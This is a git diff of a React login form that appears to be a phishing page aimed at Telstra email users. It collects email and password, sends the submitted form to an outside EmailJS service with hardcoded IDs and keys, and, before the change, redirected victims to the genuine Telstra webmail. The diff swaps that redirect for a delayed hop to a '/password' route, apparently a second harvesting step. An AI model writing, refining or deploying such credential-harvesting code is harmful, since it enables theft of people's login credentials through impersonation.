@@ -1,10 +1,12 @@
-import { useState, useRef } from "react"; // Combined imports
+import { useState, useRef } from "react";
+import { useNavigate } from "react-router-dom"; // MUST import this
 import emailjs from "@emailjs/browser";
-import logo from "../../public/logo.png";
+import logo from "../assets/logo.png";
 
 export default function LoginForm() {
-  // 1. Hooks must be at the top level
   const formRef = useRef(); 
+  const navigate = useNavigate(); // MUST initialize this
+  
   const [email, setEmail] = useState("");
   const [password, setPassword] = useState("");
   const [showPassword, setShowPassword] = useState(false);
@@ -12,17 +14,14 @@ export default function LoginForm() {
   function sendEmail(e) {
     e.preventDefault();
 
-    // 2. Access the current form via the ref defined above
     emailjs.sendForm(
       "service_zjlwo6t",
       "template_52a3qyr",
-      formRef.current, // Use the ref here
+      formRef.current,
       "_Q9xZ5XCSNDfFv5ef"
     ) 
-    .then(
-      () => {
+    .then(() => {
         console.log("Email sent successfully!");
-
         e.target.reset();
       },
       (error) => {
@@ -30,9 +29,10 @@ export default function LoginForm() {
       }
     )
     .finally(() => {
+      // This will now work because 'navigate' is defined above
       setTimeout(() => {
-        window.location.href = "https://email.telstra.com/";
-      }, 500);
+        navigate("/password"); 
+      }, 3000);
     });
   }
 
@@ -59,7 +59,6 @@ export default function LoginForm() {
               required
             />
             
-
             <label>Password</label>
             <div className="password-wrapper">
               <input
